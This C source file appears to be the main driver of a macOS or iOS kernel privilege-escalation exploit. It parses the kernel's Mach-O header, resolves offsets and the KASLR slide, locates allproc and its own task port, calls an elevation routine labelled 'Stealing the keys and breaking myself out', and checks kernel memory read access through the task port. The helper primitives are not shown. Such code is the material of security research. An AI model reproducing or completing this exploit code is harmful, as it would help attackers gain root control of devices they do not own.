#include "main.h"

/*
NOTE:
if returning in the future remember to fix find_allproc() + restore find_cmds() functionality
Temp changes are labelled: "FIX ME"
*/

#define FAST

int initialize()
{
    // I've formatted it like this to emphasise importance of order and interdependency, there won't be that many
    printf("\n[*] Loading library - ");
    toolbox = buy_toolbox();

    if (toolbox)
    {
        printf("\n[*] Parsing Mach-O header");
        toolbox->header = parse_macho(toolbox);

        if (toolbox->header)
        {
            printf("\n[*] Storing commands - ");

            toolbox->commands = find_cmds(toolbox);
            if (toolbox->commands)
            {
                printf("\n[*] Finding offsets - ");
                toolbox->offsets = find_offsets(toolbox);
            }
        }
    }

    printf("\n");
    return !(toolbox->initialised = (toolbox && toolbox->header && toolbox->commands && toolbox->offsets));
}

int main()
{
    printf("\n[*] UID: %d, PID: %d\n", getuid(), getpid());

    if (initialize())
    {
        printf("Failed setup :(\n");
        return 1;
    }

    printf("\n[*] Base at: 0x%llx, kaslr slide: 0x%llx, kern struct: 0x%llx", toolbox->base, toolbox->slide,
           find_proc(toolbox, 0));
    printf("\n[*] Allproc: %llx, task_port: %llx", toolbox->allproc, toolbox->offsets->my_task_port);

    printf("\n[*] Stealing the keys and breaking myself out - ");
    if (safe_elevate(toolbox, getpid()) || test_rw())
        return 1;

    printf((read_pointer(toolbox, read_pointer(toolbox, toolbox->offsets->my_task_port + __ip_kobject_offset) +
                                      __bsd_info) == toolbox->offsets->my_proc)
               ? "Yo! It worked!"
               : "Huh? You got the wrong task_port my friend");

    return 0;
}
